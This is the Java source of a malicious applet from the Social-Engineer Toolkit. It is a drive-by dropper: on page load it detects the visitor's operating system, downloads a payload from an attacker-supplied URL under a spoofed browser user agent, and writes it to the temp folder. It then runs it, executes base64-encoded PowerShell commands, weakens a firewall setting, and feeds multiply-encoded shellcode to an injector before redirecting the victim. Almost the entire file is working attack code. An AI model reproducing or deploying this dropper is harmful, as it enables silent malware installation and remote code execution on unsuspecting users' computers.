import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import sun.misc.BASE64Decoder;
import java.net.URL;
import java.net.URLConnection;

// import javax.swing.JOptionPane;
// JOptionPane.showMessageDialog(null, "Hello World!");

/**************************************************************
*
*    Java Applet for the Social-Engineer Toolkit
*    Original work from Thomas Werth and customized
*    by Dave Kennedy (@HackingDave). 
*
**************************************************************/
public class Java extends Applet {

	private Object initialized = null;
	public Object isInitialized()
	{
		return initialized;
	}

    public void init() 
    {
        Process f;

        try {
            // generate a random string
    	    Random r = new Random();
    	    String token = Long.toString(Math.abs(r.nextLong()), 36);
            String pfad = System.getProperty("java.io.tmpdir") + File.separator;
            String writedir = System.getProperty("java.io.tmpdir") + File.separator;
            // grab operating system
            String os = System.getProperty("os.name").toLowerCase();
            // grab jvm architecture
            String arch = System.getProperty("os.arch");
            String  downParm   = "";
            String  nextParm   = "";
            String  thirdParm  = "";
            String  fourthParm = "";
            String  fifthParm  = "";
    	    String  sixthParm  = "";
	        String  seventhParm = "";
	        String  eightParm = "";
            short osType = -1 ;  // 0=WIN, 1=MAC, 2=NIX
            if  (os.indexOf( "win" ) >= 0) // We are running Windows then
            {
    		    // 1 = WINDOWSPLZ
	    	    // 2 = ILIKESTUFF
		        // 3 = OSX
		        // 4 = LINUX
		        // 5 = X64
	 	        // 6 = X86
		        // 7 = HUGSNOTDRUGS
	    	    // 8 = LAUNCH 
		        // 9 = nextPage
		        // 10 = B64EncodeTimes
                downParm    =   getParameter( "1" );
                nextParm    =   getParameter( "2"  );
                thirdParm   =   getParameter( "5" );
                fourthParm  =   getParameter( "6" );
                fifthParm   =   getParameter( "7" );
	    	    sixthParm   =   getParameter( "8" );
		        seventhParm =   getParameter( "9" );
		        eightParm   =   getParameter( "10" );
                osType      =   0;
                pfad += token + ".exe";
            	}
                	else if (os.indexOf("mac") >= 0) // OSX
            	{
                	downParm    =   getParameter( "3" );
                	osType      =   1;
		            // look for special folders to define snow leopard, etc.
  		            if (pfad.startsWith("/var/folders/")) pfad = "/tmp/"; // OSX SNOW LEOPARD AND ABOVE
	                    pfad += token + ".bin";
                }
                else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
                {
                downParm    =   getParameter( "4" );
                osType      =   2;
                pfad += token + ".bin";
                }
    	   	if ( downParm.length() > 0  && pfad.length() > 0 )
	        {

       // powershell detection here
	   if ( osType < 1 )
	   {
	       // here we check for powershell
           File file = new File("c:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe");
	       if (sixthParm.length() < 4) {
  	            if (!file.exists()) {
 	                // URL parameter
        	        URL url = new URL(downParm);
            	    // Open the conneciton
 	    	        URLConnection hc = url.openConnection();
            	    // set the user agent string
            	    hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
            	    // grab content type
            	    String contentType = hc.getContentType();
            	    // grab content length
            	    int contentLength = hc.getContentLength();
            	    // pull input stream
	                InputStream raw = hc.getInputStream();
            	    // stream buffer into raw input stream
    	    	    InputStream in = new BufferedInputStream(raw);
            	    // write the bytes out
       	    	    byte[] data = new byte[contentLength];
            	    int bytesRead = 0;
            	    int offset = 0;
            	    while (offset < contentLength) {
                	    bytesRead = in.read(data, offset, data.length - offset);
                	    if (bytesRead == -1)
                    	break;
	                    offset += bytesRead;
		            }
            	    // close it
            	    in.close();
            	    // write file out to pfad
            	    String filename = url.getFile();
            	    FileOutputStream out = new FileOutputStream(pfad);
            	    // close everything out
	                out.write(data);
        	        out.flush();
                    out.close();
                    }
		    }
		}

		if ( osType < 1 )
		{
		    // This is if we are using a custom payload delivery
		    // CUSTOM PAYLOAD FOR WINDOWS HERE
		    // if sixth parameter is greater than yes, which is CUST, four characters then trigger on custom payload for download
    		if (sixthParm.length() > 3) {
                // URL parameter
                URL url = new URL(downParm);
                // Open the conneciton
                URLConnection hc = url.openConnection();
                // set the user agent string
                hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                // grab content type
                String contentType = hc.getContentType();
                // grab content length
                int contentLength = hc.getContentLength();
                // pull input stream
                InputStream raw = hc.getInputStream();
                // stream buffer into raw input stream
                InputStream in = new BufferedInputStream(raw);
                // write the bytes out
                byte[] data = new byte[contentLength];
                int bytesRead = 0;
                int offset = 0;
                while (offset < contentLength) {
                        bytesRead = in.read(data, offset, data.length - offset);
                        if (bytesRead == -1)
                        break;
                        offset += bytesRead;
                            }
                // close it
                in.close();
                // write file out to pfad
                String filename = url.getFile();
                FileOutputStream out = new FileOutputStream(pfad);
                // close everything out
                out.write(data);
                out.flush();
                out.close();
                }
        }

    	// download file all other OS
		if ( osType > 1 )
        {
                // URL parameter
                URL url = new URL(downParm);
                // Open the conneciton
                URLConnection hc = url.openConnection();
                // set the user agent string
                hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                // grab content type
                String contentType = hc.getContentType();
                // grab content length
                int contentLength = hc.getContentLength();
                // pull input stream
                InputStream raw = hc.getInputStream();
                // stream buffer into raw input stream
                InputStream in = new BufferedInputStream(raw);
                // write the bytes out
                byte[] data = new byte[contentLength];
                int bytesRead = 0;
                int offset = 0;
                while (offset < contentLength) 
                {
                        bytesRead = in.read(data, offset, data.length - offset);
                        if (bytesRead == -1)
                        break;
                        offset += bytesRead;
                }
                // close it
                in.close();
                // write file out to pfad
                String filename = url.getFile();
                FileOutputStream out = new FileOutputStream(pfad);
                // close everything out
                out.write(data);
                out.flush();
                out.close();
		    }


/*
            // has it executed yet? then target nextPage to victim
            String page = getParameter( "9" );
            if ( page != null && page.length() > 0 )
            {
                URL urlPage = new URL(page);
                getAppletContext().showDocument(urlPage);
            }
*/
    	// Here is where we define OS type, i.e. windows, linux, osx, etc.

        if ( osType < 1 ) // If we're running Windows 
        {
            // attempt to disable statefulftp if running as an administrator
            f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
            // powershell x86 or 64 bit
            if (thirdParm.length() > 3) 
            {
                BASE64Decoder decoder = new BASE64Decoder();
                byte[] decoded = decoder.decodeBuffer(thirdParm);
                String decoded_string =  new String(decoded);
		        // iterate through Parm for our injection 
			    String strMain = decoded_string;
			    String[] arrSplit = strMain.split(",");
		        for (int i=0; i<arrSplit.length; i++)
			    {
	                f = Runtime.getRuntime().exec("cmd.exe /c " + arrSplit[i]);
	            }            
            }

     // }
            // if we aren't using the shellcodeexec attack
            if (nextParm.length() < 3)
            {
			    // if we turned on binary dropping
			    if (sixthParm.length() > 2)
			    {
				    // if we are using the SET interactive shell
				    if (fifthParm.length() > 2)
				    {
					//  logfile stuff here 42logfile42.tmp
					// write out a temp file if we aren't going to pass parameters
				        f = Runtime.getRuntime().exec("cmd.exe /c \"" + "echo " + fifthParm + " > " + writedir + "42logfile.tmp" + "\"");
					    f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + fifthParm + "\"");
				    }


				    // if we aren't using SET interactive shell
				    if (fifthParm.length() < 2)
				    {
			            f = Runtime.getRuntime().exec("cmd.exe /c " + pfad);
				    }
   			   }
            }

           // if we are using shellcode exec
           if (nextParm.length() > 3)
           {

		        if (sixthParm.length() > 2)
			    {
				    // all parameters are base64 encoded, this will decode for us and pass the decoded strings
                    BASE64Decoder decoder = new BASE64Decoder();
                    byte[] decoded = decoder.decodeBuffer(nextParm);
				    String decoded_string =  new String(decoded);
                    // decode again
				    String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
				    // again
				    String decoded_string_3 = new String(decoder.decodeBuffer(decoded_string_2));
				    // again
				    String decoded_string_4 = new String(decoder.decodeBuffer(decoded_string_3));
				    // again
				    String decoded_string_5 = new String(decoder.decodeBuffer(decoded_string_4));
				    // again
				    String decoded_string_6 = new String(decoder.decodeBuffer(decoded_string_5));
				    // again
				    String decoded_string_7 = new String(decoder.decodeBuffer(decoded_string_6));
				    // again 
				    String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
				    // again
				    String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
                    // again
		            String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
		            // last one
                    String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));

				    PrintStream out = null;
				    String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
				    try 
				    {
				        out = new PrintStream(new FileOutputStream(writedir + randomfile));
				        out.print(decoded_string_11);
				    }

				    finally 
				    {
				        if (out != null) out.close();
				    }
					// this is if we are using multipyinjector
			        f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
					// this runs the single instance of shellcodeexec, pyinjector, or a binary
					f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + decoded_string_11 + "\"");
				}
	            }

            }
            //}

        else // if not windows then use linux/osx/etc.
        {
		    // change permisisons to execute
	    Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
            process1.waitFor();                
		    //and execute
            f = Runtime.getRuntime().exec(pfad);
		    // wait for termination
		    f.waitFor();
		    // delete old file
		    (
                new File(pfad)).delete();
            }
			initialized = this;

        }

    // has it executed yet? then target nextPage to victim
    String page = getParameter( "9" );
    if ( page != null && page.length() > 0 )
        {
            URL urlPage = new URL(page);
            getAppletContext().showDocument(urlPage);
        }

        } 
            catch(IOException e) {
            e.printStackTrace();
        }
    	/* ended here and commented out below for bypass */
	    catch (Exception exception)
    	{
		    exception.printStackTrace();
	    }

    }
}


